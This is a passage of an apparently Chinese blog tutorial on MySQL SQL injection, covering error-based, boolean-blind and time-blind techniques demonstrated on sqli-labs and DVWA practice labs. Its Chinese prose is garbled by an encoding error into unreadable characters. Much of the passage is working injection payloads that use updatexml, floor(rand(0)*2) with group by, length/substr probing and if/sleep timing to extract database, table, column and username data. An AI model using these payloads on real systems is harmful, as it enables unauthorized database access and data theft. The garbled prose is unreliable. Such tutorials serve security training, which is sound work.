<ul>
<li>XML_documentÔºöXML ÊñáÊ°£ÂêçÁß∞Ôºå‰ΩøÁî® String Ê†ºÂºè‰Ωú‰∏∫ÂèÇÊï∞</li>
<li>XPath_stringÔºöË∑ØÂæÑÔºåXPath Ê†ºÂºèÔºå<code>extractvalue()</code>ÂáΩÊï∞‰πüÂú®ËøôÈáå‰∫ßÁîüÊä•Èîô</li>
<li><code>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</code></li>
</ul>
<p>Âà©Áî®<code>updatexml()</code>ËøõË°åÂÆûÊàò</p>
<p>payload:</p>
<p><code>1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</code></p>
<h4 id="‰∏ªÈîÆÊä•ÈîôÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#‰∏ªÈîÆÊä•ÈîôÊ≥®ÂÖ•"></a> ‰∏ªÈîÆÊä•ÈîôÊ≥®ÂÖ•</h4>
<p>ÊòØÁî±‰∫é<code>rand()</code>Ôºå<code>count()</code> Ôºå<code>floor()</code>‰∏â‰∏™ÂáΩÊï∞Âíå‰∏Ä‰∏™<code>group by</code>ËØ≠Âè•ËÅîÂêà‰ΩøÁî®ÈÄ†ÊàêÁöÑÔºåÁº∫‰∏Ä‰∏çÂèØ</p>
<blockquote>
<p>ÈÄöËøá floor Êä•ÈîôÁöÑÊñπÊ≥ïÊù•ÁàÜÊï∞ÊçÆÁöÑÊú¨Ë¥®ÊòØ group by ËØ≠Âè•ÁöÑÊä•Èîô„ÄÇgroup by ËØ≠Âè•Êä•ÈîôÁöÑÂéüÂõ†</p>
<p>ÊòØ floor(random(0)*2)ÁöÑ‰∏çÁ°ÆÂÆöÊÄßÔºåÂç≥ÂèØËÉΩ‰∏∫ 0 ‰πüÂèØËÉΩ‰∏∫ 1</p>
<p>group by key ÊâßË°åÊó∂Âæ™ÁéØËØªÂèñÊï∞ÊçÆÁöÑÊØè‰∏ÄË°åÔºåÂ∞ÜÁªìÊûú‰øùÂ≠ò‰∫é‰∏¥Êó∂Ë°®‰∏≠„ÄÇËØªÂèñÊØè‰∏ÄË°åÁöÑ key Êó∂Ôºå</p>
<p>Â¶ÇÊûú key Â≠òÂú®‰∫é‰∏¥Êó∂Ë°®‰∏≠ÔºåÂàôÊõ¥Êñ∞‰∏¥Êó∂Ë°®‰∏≠ÁöÑÊï∞ÊçÆÔºàÊõ¥Êñ∞Êï∞ÊçÆÊó∂Ôºå‰∏çÂÜçËÆ°ÁÆó rand ÂÄºÔºâÔºõÂ¶ÇÊûú</p>
<p>ËØ• key ‰∏çÂ≠òÂú®‰∫é‰∏¥Êó∂Ë°®‰∏≠ÔºåÂàôÂú®‰∏¥Êó∂Ë°®‰∏≠ÊèíÂÖ• key ÊâÄÂú®Ë°åÁöÑÊï∞ÊçÆ„ÄÇÔºàÊèíÂÖ•Êï∞ÊçÆÊó∂Ôºå‰ºöÂÜçËÆ°ÁÆó</p>
<p>rand ÂÄºÔºâ</p>
<p>Â¶ÇÊûúÊ≠§Êó∂‰∏¥Êó∂Ë°®Âè™Êúâ key ‰∏∫ 1 ÁöÑË°å‰∏çÂ≠òÂú® key ‰∏∫ 0 ÁöÑË°åÔºåÈÇ£‰πàÊï∞ÊçÆÂ∫ìË¶ÅÂ∞ÜËØ•Êù°ËÆ∞ÂΩïÊèíÂÖ•‰∏¥</p>
<p>Êó∂Ë°®ÔºåÁî±‰∫éÊòØÈöèÊú∫Êï∞ÔºåÊèíÊó∂ÂèàË¶ÅËÆ°ÁÆó‰∏Ä‰∏ãÈöèÊú∫ÂÄºÔºåÊ≠§Êó∂ floor(random(0)*2)ÁªìÊûúÂèØËÉΩ‰∏∫ 1ÔºåÂ∞±</p>
<p>‰ºöÂØºËá¥ÊèíÂÖ•Êó∂ÂÜ≤Á™ÅËÄåÊä•Èîô„ÄÇÂç≥Ê£ÄÊµãÊó∂ÂíåÊèíÂÖ•Êó∂‰∏§Ê¨°ËÆ°ÁÆó‰∫ÜÈöèÊú∫Êï∞ÁöÑÂÄº</p>
<p>ÂÆûÈôÖÊµãËØï‰∏≠ÂèëÁé∞ÔºåÂá∫Áé∞Êä•ÈîôÔºåËá≥Â∞ëË¶ÅÊ±ÇÊï∞ÊçÆËÆ∞ÂΩï‰∏∫ 3 Ë°åÔºåËÆ∞ÂΩïÊï∞Ë∂ÖËøá 3 Ë°å‰∏ÄÂÆö‰ºöÊä•ÈîôÔºå2 Ë°åÊó∂ÊòØ‰∏çÊä•ÈîôÁöÑ„ÄÇ</p>
</blockquote>
<h5 id="ÂÆûÊàòÊµÅÁ®ã"><a class="markdownIt-Anchor" href="#ÂÆûÊàòÊµÅÁ®ã"></a> ÂÆûÊàòÊµÅÁ®ã</h5>
<ol>
<li>
<p>Âà§Êñ≠ÊòØÂê¶Â≠òÂú®Êä•ÈîôÊ≥®ÂÖ•</p>
<p><code>id=1' union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x#</code></p>
<p>ÊúâÈîôËØØÂõûÊòæÂàôÂ≠òÂú®</p>
</li>
<li>
<p>ÁàÜÂá∫ÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêç</p>
<p><code>id=1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #</code></p>
</li>
<li>
<p>ÁàÜÂá∫Ë°®</p>
<p><code>id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#</code></p>
</li>
<li>
<p>ÁàÜÂá∫Â≠óÊÆµÂêç</p>
<p><code>id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#</code></p>
<p>ÊîπÂèò<code>LIMIT</code>ÁöÑÈôêÂÆöÊï∞ÂÄº</p>
</li>
</ol>
<h4 id="Êï∞ÊçÆÊ∫¢Âá∫Êä•Èîô"><a class="markdownIt-Anchor" href="#Êï∞ÊçÆÊ∫¢Âá∫Êä•Èîô"></a> Êï∞ÊçÆÊ∫¢Âá∫Êä•Èîô</h4>
<h4 id="expÂáΩÊï∞"><a class="markdownIt-Anchor" href="#expÂáΩÊï∞"></a> exp()ÂáΩÊï∞</h4>
<p>Êàë‰ª¨ÂèØÁî®Âà©Áî® Mysql Double Êï∞ÂÄºËåÉÂõ¥ÊúâÈôêÁöÑÁâπÊÄßÊûÑÈÄ†Êä•ÈîôÔºå‰∏ÄÊó¶ÁªìÊûúË∂ÖËøáËåÉÂõ¥Ôºå<code>exp()</code>ÂáΩÊï∞Â∞±‰ºöÊä•ÈîôÔºåËøô‰∏™ÂàÜÁïåÁÇπÂ∞±ÊòØ 709ÔºåÂΩì<code>exp()</code>ÂáΩÊï∞‰∏≠ÁöÑÊï∞Â≠óË∂ÖËøá 709 Êó∂Â∞±‰ºö‰∫ßÁîüÊä•Èîô</p>
<p>ÂΩì MySQL ÁâàÊú¨Â§ß‰∫é 5.5.53 Êó∂Ôºå<code>exp()</code>ÂáΩÊï∞Êä•ÈîôÊó†Ê≥ïËøîÂõûÊü•ËØ¢ÁªìÊûúÔºåÂè™‰ºöÂæóÂà∞‰∏Ä‰∏™Êä•ÈîôÔºåÊâÄ‰ª•Âú®ÁúüÂÆûÁéØÂ¢É‰∏≠‰ΩøÁî®ÂÆÉÂÅöÊ≥®ÂÖ•Â±ÄÈôêÊÄßËøòÊòØÊØîËæÉÂ§ßÁöÑÔºå‰ΩÜÊòØÂèØ‰ª•Áî®Âà§Êñ≠ÊòØÂê¶Â≠òÂú® SQL Ê≥®ÂÖ•</p>
<h4 id="powÂáΩÊï∞"><a class="markdownIt-Anchor" href="#powÂáΩÊï∞"></a> pow()ÂáΩÊï∞</h4>
<p>Êä•ÈîôÂéüÁêÜÂíå<code>exp()</code>ÂáΩÊï∞‰∏ÄÊ†∑ÔºåË∂ÖÂá∫‰∫Ü Mysql Double Êï∞ÂÄºÁöÑËåÉÂõ¥ÔºåÂØºËá¥Êä•Èîô</p>
<h4 id="Á©∫Èó¥Êï∞ÊçÆÁ±ªÂûãÊä•Èîô"><a class="markdownIt-Anchor" href="#Á©∫Èó¥Êï∞ÊçÆÁ±ªÂûãÊä•Èîô"></a> Á©∫Èó¥Êï∞ÊçÆÁ±ªÂûãÊä•Èîô</h4>
<p>ËøôÁ±ªÊä•ÈîôÂõ†‰∏∫ Mysql ÁâàÊú¨ÈôêÂà∂ÂØºËá¥Áî®ÁöÑÊØîËæÉÂ∞ëÔºåËøôÈáåÂàóÂá∫Êù•ÔºåÂ§ßÂÆ∂ÊúâÂÖ¥Ë∂£ÁöÑËØùÂèØ‰ª•ÂÅö‰∏Ä‰∏ãÊ∑±ÂÖ•Á†îÁ©∂ÔºåÁÆÄÂçïÊù•ËØ¥ÔºåËøôÁ±ªÂáΩÊï∞Êä•ÈîôÁöÑÂéüÂõ†ÊòØ<strong>ÂáΩÊï∞ÂØπÂèÇÊï∞Ë¶ÅÊ±ÇÊòØÂΩ¢Â¶ÇÔºà1 2,3 3,2 2 1ÔºâËøôÊ†∑Âá†‰ΩïÊï∞ÊçÆÔºåÂ¶ÇÊûú‰∏çÊª°Ë∂≥Ë¶ÅÊ±ÇÔºåÂàô‰ºöÊä•Èîô</strong>ÔºåÂèØ‰ª•‰∫ßÁîüÊä•ÈîôÁöÑÂáΩÊï∞Â¶Ç‰∏ãÔºö</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
multiponint<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Â∏ÉÂ∞îÁõ≤Ê≥®"><a class="markdownIt-Anchor" href="#Â∏ÉÂ∞îÁõ≤Ê≥®"></a> Â∏ÉÂ∞îÁõ≤Ê≥®</h3>
<h4 id="Â∏∏Áî®ÂáΩÊï∞"><a class="markdownIt-Anchor" href="#Â∏∏Áî®ÂáΩÊï∞"></a> Â∏∏Áî®ÂáΩÊï∞</h4>
<ul>
<li>
<p><code>left()</code>ÂáΩÊï∞Ôºö‰ªéÂ∑¶ËæπÊà™ÂèñÊåáÂÆöÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤</p>
<pre class="line-numbers language-none"><code class="language-none">left(ÊåáÂÆöÂ≠óÁ¨¶‰∏≤ÔºåÊà™ÂèñÈïøÂ∫¶)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>length()</code>ÂáΩÊï∞ÔºöËé∑ÂèñÊåáÂÆöÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶</p>
<pre class="line-numbers language-none"><code class="language-none">length(ÊåáÂÆöÂ≠óÁ¨¶‰∏≤)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>substr()</code>ÂáΩÊï∞Âíå<code>mid()</code>ÂáΩÊï∞ÔºöÊà™ÂèñÂ≠óÁ¨¶‰∏≤ÔºåÂèØ‰ª•ÊåáÂÆöËµ∑Âßã‰ΩçÁΩÆÔºà‰ªé 1 ÂºÄÂßãËÆ°ÁÆóÔºâÂíåÈïøÂ∫¶</p>
<pre class="line-numbers language-none"><code class="language-none">substr(Â≠óÁ¨¶‰∏≤ÔºåËµ∑Âßã‰ΩçÁΩÆÔºåÊà™ÂèñÈïøÂ∫¶)
mid(Â≠óÁ¨¶‰∏≤ÔºåËµ∑Âßã‰ΩçÁΩÆÔºåÊà™ÂèñÈïøÂ∫¶)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p><code>ascii()</code>ÂáΩÊï∞ÔºöÂ∞ÜÊåáÂÆöÂ≠óÁ¨¶‰∏≤ËøõË°å ascii ÁºñÁ†Å</p>
<pre class="line-numbers language-none"><code class="language-none">ascii(ÊåáÂÆöÂ≠óÁ¨¶‰∏≤)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<h4 id="ÂéüÁêÜ"><a class="markdownIt-Anchor" href="#ÂéüÁêÜ"></a> ÂéüÁêÜ</h4>
<p>Â∏ÉÂ∞îÔºàBooleanÔºâÊòØ‰∏ÄÁßçÊï∞ÊçÆÁ±ªÂûãÔºåÈÄöÂ∏∏ÊòØÁúüÂíåÂÅá‰∏§‰∏™ÂÄºÔºåËøõË°åÂ∏ÉÂ∞îÁõ≤Ê≥®ÂÖ•Êó∂Êàë‰ª¨ÂÆûÈôÖ‰∏ä‰ΩøÁî®ÁöÑÊòØÊäΩË±°ÁöÑÂ∏ÉÂ∞îÊ¶ÇÂøµÔºåÂç≥ÈÄöËøáÈ°µÈù¢ËøîÂõûÊ≠£Â∏∏ÔºàÁúüÔºâ‰∏é‰∏çÊ≠£Â∏∏ÔºàÂÅáÔºâÂà§Êñ≠</p>
<p>ËøôÈáåÂà©Áî®<code>sqlilab</code>Á¨¨8ÂÖ≥ËøõË°åÊºîÁ§∫</p>
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703220052152.png" class="" alt="image-20240703220052152" loading="lazy">
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703220059925.png" class="" alt="image-20240703220059925" loading="lazy">
<p>ÂèØ‰ª•ÁúãÂà∞ÔºåÊú¨ÂÖ≥‰∏∫Â≠óÁ¨¶ÂûãÊ≥®ÂÖ•Ôºå‰ΩøÁî®ÂçïÂºïÂè∑ÂåÖË£π</p>
<p>ËøôÈáåÂè™‰ºöÂõûÊòæÁúüÊàñÂÅáÔºåËøôÂ∞±‰∏∫Êàë‰ª¨ËøõË°åÂ∏ÉÂ∞îÁõ≤Ê≥®ÂàõÈÄ†‰∫ÜÊù°‰ª∂</p>
<p>Âõ†‰∏∫ËøôÈáåÂè™‰ºöÂõûÊòæÁúüÊàñÂÅáÔºåÊó†Ê≥ïÊãøÂà∞Êï∞ÊçÆÂ∫ìÁöÑÂêçÁß∞Ôºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•Èôç‰Ωé‰∏ÄÁÇπÊù°‰ª∂ÔºåÂÖàÂà§Êñ≠Âá∫<code>Êï∞ÊçÆÂ∫ìÂêçÁöÑÈïøÂ∫¶</code>ÔºåÁî®‰∫åÂàÜÊ≥ïËßÇÂØüÂõûÊòæ</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;ÂÖàÁåúÊµãÊï∞ÊçÆÂ∫ìÂêçÊòØÂê¶ÊØî5ÈïøÔºåÂèëÁé∞‰∏∫Áúü
1&#39; and length(database())&gt;5--+

&#x2F;&#x2F;ÂÜçÂà§Êñ≠Êï∞ÊçÆÂ∫ìÊòØÂê¶ÊØî10ÈïøÔºåÂèëÁé∞‰∏∫ÂÅá
1&#39; and length(database())&gt;10--+

&#x2F;&#x2F;Ê≠§Êó∂Êï∞ÊçÆÂ∫ìÂ§ß‰∫é5Â∞è‰∫éÁ≠â‰∫é10Ôºå‰æùÊ¨°Â∞ùËØïÂèØ‰ª•ÂèëÁé∞ÈïøÂ∫¶‰∏∫8
1&#39; and length(database())&#x3D;8--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÊãøÂà∞ÈïøÂ∫¶ÂêéÔºåÊàë‰ª¨‰ΩøÁî®<code>substr()</code>ÂáΩÊï∞Êàñ<code>mid()</code>ÂáΩÊï∞‰∏Ä‰Ωç‰∏Ä‰ΩçÁöÑÁåúÊµãÊï∞ÊçÆÂ∫ìÂ≠óÁ¨¶ÔºåmysqlÁöÑÂ∫ìÂêç‰∏ÄÂÖ±ÂèØ‰ª•‰ΩøÁî®<code>63</code>‰∏™Â≠óÁ¨¶ÔºåÂàÜÂà´ÊòØ<code>a-z</code>,<code>A-Z</code>,<code>0-9</code>,<code>_</code></p>
<p>ÁàÜÁ†¥Âá∫Êï∞ÊçÆÂ∫ìÁöÑÂêçÂ≠óÂêé</p>
<p>ÂÜçÁî®<code>count()</code>ÂáΩÊï∞Êù•Âà§Êñ≠Ë°®ÁöÑ‰∏™Êï∞</p>
<p><code>?id=1'and(select count(table_name)from information_schema.tables where table_schema=database())=4 --+</code></p>
<p>ÂæÖË°®ÁöÑ‰∏™Êï∞Ê∏ÖÊô∞ÂêéÂÜçÊù•Âà§Êñ≠ÊØè‰∏™Ë°®ÂêçÁöÑÈïøÂ∫¶ÔºåËøôÈáå‰ΩøÁî®‰∫Ü<code>limit</code>ÊñπÊ≥ï</p>
<pre class="line-numbers language-none"><code class="language-none">Á¨¨‰∏Ä‰∏™Ë°®ÈïøÂ∫¶‰∏∫6
?id&#x3D;1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;6 --+

Á¨¨‰∫å‰∏™Ë°®ÈïøÂ∫¶‰∏∫8
?id&#x3D;1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;8 --+

Á¨¨‰∏â‰∏™Ë°®ÈïøÂ∫¶‰∏∫7
?id&#x3D;1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 2,1))&#x3D;7 --+

Á¨¨Âõõ‰∏™Ë°®ÈïøÂ∫¶‰∏∫5
?id&#x3D;1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1))&#x3D;5 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Áü•ÈÅìÊØè‰∏™Ë°®ÁöÑÈïøÂ∫¶ÂêéÔºåÊàë‰ª¨ÂÜç‰ΩøÁî®ÂíåÂ∫ìÂêç‰∏ÄÊ†∑ÁöÑÊñπÂºèÁåúËß£Ë°®Âêç</p>
<p>Áü•ÈÅìË°®ÔºàÁ¨¨Âõõ‰∏™Ë°®ÔºåÈïøÂ∫¶‰∏∫‰∫îÔºåÊòØ usersÔºâÁöÑ‰ø°ÊÅØÂêéÔºåÊàë‰ª¨ÂÜçÊù•ÁåúÂàóÁöÑ‰∏™Êï∞ÔºåËøôÈáåÂèØ‰ª•ÁúãÂà∞Êúâ‰∏â‰∏™Âàó</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39; and (select count(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; &#39;users&#39;)&#x3D;3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ÂÜçÊù•Âà§Êñ≠ÊØè‰∏™ÂàóÁöÑÈïøÂ∫¶</p>
<pre class="line-numbers language-none"><code class="language-none">Á¨¨‰∏Ä‰∏™ÂàóÈïøÂ∫¶‰∏∫2
?id&#x3D;1&#39; and length((select  column_name from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; &#39;users&#39; limit 0,1))&#x3D;2 --+

Á¨¨‰∫å‰∏™ÂàóÈïøÂ∫¶‰∏∫8
?id&#x3D;1&#39; and length((select  column_name from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; &#39;users&#39; limit 1,1))&#x3D;8 --+

Á¨¨‰∏â‰∏™ÂàóÈïøÂ∫¶‰∏∫8
?id&#x3D;1&#39; and length((select  column_name from information_schema.columns where table_sch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂÜçÁî®ÂêåÊ†∑ÁöÑÊñπÊ≥ïÁåúËß£ÂàóÁöÑÂêçÂ≠óÔºåËøôÈáå‰ª•Á¨¨‰∫å‰∏™Âàó‰∏∫‰æã,ËøõË°åÁàÜÁ†¥</p>
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703221257733.png" class="" alt="image-20240703221257733" loading="lazy">
<p>‰∏ãÈù¢ËøòÊòØÂ¶ÇÊ≥ïÁÇÆÂà∂ÔºåÂà§Êñ≠Âàó‰∏≠ÊúâÂ§öÂ∞ëÊï∞ÊçÆÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®<code>count(*)</code></p>
<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and (select count(*) from users)&#x3D;13 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>‰πãÂêéÂÜçÊù•Âà§Êñ≠ÊØèÊù°Êï∞ÊçÆÁöÑÈïøÂ∫¶</p>
<pre class="line-numbers language-none"><code class="language-none">Á¨¨‰∏Ä‰∏™Êï∞ÊçÆÈïøÂ∫¶‰∏∫4
?id&#x3D;1&#39; and length((select username from users limit 0,1))&#x3D;4  --+

Á¨¨‰∫å‰∏™Êï∞ÊçÆÈïøÂ∫¶‰∏∫8
?id&#x3D;1&#39; and length((select username from users limit 1,1))&#x3D;8  --+

Á¨¨‰∏â‰∏™Êï∞ÊçÆÈïøÂ∫¶‰∏∫5
?id&#x3D;1&#39; and length((select username from users limit 2,1))&#x3D;5  --+

...

Á¨¨ÂçÅ‰∏â‰∏™Êï∞ÊçÆÈïøÂ∫¶‰∏∫6
?id&#x3D;1&#39; and length((select username from users limit 12,1))&#x3D;6  --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÂÜçÁî®ÂêåÊ†∑ÁöÑÊñπÊ≥ïÁåúËß£Êï∞ÊçÆÁöÑÂÜÖÂÆπÔºåËøôÈáå‰ª•Á¨¨‰∏Ä‰∏™Êï∞ÊçÆ‰∏∫‰æãÔºåÊï∞ÊçÆÂÜÖÂÆπ‰∏∫ dumb</p>
<p>Ëá≥Ê≠§Â∏ÉÂ∞îÁõ≤Ê≥®ÁöÑÂéüÁêÜÂ∞±Â∑≤ÁªèÊ∏ÖÊô∞‰∫ÜÔºåÂèØ‰ª•Áî®‰∏ÄÂº†ÂØºÂõæÊù•ÊÄªÁªì</p>
<img src="/2024/07/04/%E5%88%9D%E8%AF%86sql%E6%B3%A8%E5%85%A5/image-20240703221417936.png" class="" alt="image-20240703221417936" loading="lazy">
<h3 id="Êó∂Èó¥Áõ≤Ê≥®"><a class="markdownIt-Anchor" href="#Êó∂Èó¥Áõ≤Ê≥®"></a> Êó∂Èó¥Áõ≤Ê≥®</h3>
<h4 id="Â∏∏Áî®ÂáΩÊï∞-2"><a class="markdownIt-Anchor" href="#Â∏∏Áî®ÂáΩÊï∞-2"></a> Â∏∏Áî®ÂáΩÊï∞</h4>
<ul>
<li>
<p><code>sleep()</code>ÂáΩÊï∞ÔºöÂ∞ÜÁ®ãÂ∫èÊâßË°åÁöÑÁªìÊûúÂª∂ËøüËøîÂõû n Áßí</p>
<p>ËøôÈáåÊòØ<code>sleep</code>ÂáΩÊï∞ÂèØ‰ª•‰∏éÂÖ∂‰ªñsleepÂáΩÊï∞ÊõøÊç¢</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13019703.html">MySQLÊó∂Èó¥Áõ≤Ê≥®‰∫îÁßçÂª∂Êó∂ÊñπÊ≥ï - komomon - ÂçöÂÆ¢Âõ≠ (cnblogs.com)</a></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sleep<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>if()</code>ÂáΩÊï∞ÔºöÂèÇÊï∞1‰∏∫Êù°‰ª∂ÔºåÂΩìÂèÇÊï∞ 1 ËøîÂõûÁöÑÁªìÊûú‰∏∫ true Êó∂ÔºåÊâßË°åÂèÇÊï∞ 2ÔºåÂê¶ÂàôÊâßË°åÂèÇÊï∞ 3ÔºåÊúâÁÇπÂÉè Java ÈáåÁöÑ‰∏âÂÖÉËøêÁÆóÁ¨¶</p>
<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">if(ÂèÇÊï∞1ÔºåÂèÇÊï∞2ÔºåÂèÇÊï∞3)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<h4 id="ÂéüÁêÜ-2"><a class="markdownIt-Anchor" href="#ÂéüÁêÜ-2"></a> ÂéüÁêÜ</h4>
<p>Âª∂Êó∂Áõ≤Ê≥®ÁöÑÂÆûÁé∞Êú¨Ë¥®‰∏äÂ∞±ÊòØ<code>if()</code>ÂáΩÊï∞ÂµåÂ•ó<code>sleep()</code>ÂáΩÊï∞ÁöÑÁªºÂêàÂà©Áî®ÔºåÂ∞Ü<code>sleep()</code>ÂáΩÊï∞‰Ωú‰∏∫<code>if()</code>ÂáΩÊï∞ÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞Ôºå‰πüÂ∞±ÊòØÂΩìÂèÇÊï∞‰∏ÄË¢´ÊàêÂäüÊâßË°åÊó∂ÔºàÁªìÊûú‰∏∫ trueÔºâÂØπËøîÂõûÁªìÊûúÊâßË°åÂª∂Êó∂ÔºåÂèç‰πãÂàôÊâßË°åÂèÇÊï∞‰∏âÁöÑÁõ¥Êé•ÂõûÊòæ</p>
<p>ËøôÈáåÁî®<code>sqli-labs</code>Á¨¨9ÂÖ≥ËøõË°åÊºîÁ§∫</p>
<p>È¶ñÂÖàÂèØ‰ª•ÂèëÁé∞Êó†ËÆ∫‰ΩøÁî®‰ªÄ‰πàÁ¨¶Âè∑ÈÉΩÊòæÁ§∫‰∏ÄÊ†∑ÁöÑÂÜÖÂÆπÔºåÂÜç‰ΩøÁî®<code>sleep()</code>ÂáΩÊï∞ËøõË°åËæÖÂä©Âà§Êñ≠ÔºåÂèØ‰ª•ÂèëÁé∞ÂΩìÊª°Ë∂≥Èó≠ÂêàÊù°‰ª∂Êó∂ÔºåÈ°µÈù¢‰ºöÂª∂ËøüÂõûÊòæ</p>
<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and sleep(5) --+ &#x2F;&#x2F;Êª°Ë∂≥Èó≠ÂêàÊù°‰ª∂ÔºåÈ°µÈù¢Âª∂ËøüÂõûÊòæ
?id&#x3D;1&#39; and sleep(5) &#x2F;&#x2F;‰∏çÊª°Ë∂≥Èó≠ÂêàÊù°‰ª∂ÔºåÈ°µÈù¢Áõ¥Êé•ÂõûÊòæ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÊµèËßàÂô®ÁöÑ„ÄêÁΩëÁªú„ÄëÂäüËÉΩËøõË°åÊõ¥Áõ¥ËßÇÁöÑÂà§Êñ≠ÔºåÂΩìÊàë‰ª¨‰∏çÊª°Ë∂≥Èó≠ÂêàÊù°‰ª∂Êó∂ÔºåÂª∂Ëøü‰∏∫ 108 ÊØ´Áßí</p>
<p>ÂΩìÊª°Ë∂≥Èó≠ÂêàÊù°‰ª∂Êó∂ÔºåÂèØ‰ª•ÁúãÂà∞Âª∂ËøüÂ¢ûÂä†‰∫Ü‰∫îÁßí</p>
<p>ÂÖàËé∑Âèñ‰∏Ä‰∏ãÂ∫ìÈïøÂ∫¶ÔºåÂΩìÈïøÂ∫¶‰∏∫ 8 Êó∂Ôºå‰ºöÂª∂Ëøü 5 ÁßíÊâßË°åÔºåÊâÄ‰ª•ÂèØ‰ª•Á°ÆÂÆöÂ∫ìÈïøÂ∫¶‰∏∫ 8</p>
<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>‰∏ãÈù¢ÂÜçÊù•Âà§Êñ≠Â∫ìÂêçÔºå‰∏∫‰∫ÜÊñπ‰æøËßÇÂØüÂ∞ÜÂª∂Êó∂Êó∂Èó¥Ë∞É‰∏∫ 15 ÁßíÔºåËøôÊ≠•Â¶ÇÊûúÊâãÂ∑•ÊµãËØïÊïàÁéá‰ºöÈùûÂ∏∏‰ΩéÔºåÊàë‰ª¨‰æùÁÑ∂ÊòØ‰ΩøÁî® Intruder Ê®°Âùó</p>
<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and if(substr(database(),1,1)&#x3D;&#39;a&#39;,sleep(15),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="dnslogÊ≥®ÂÖ•"><a class="markdownIt-Anchor" href="#dnslogÊ≥®ÂÖ•"></a> DNSLOGÊ≥®ÂÖ•</h3>
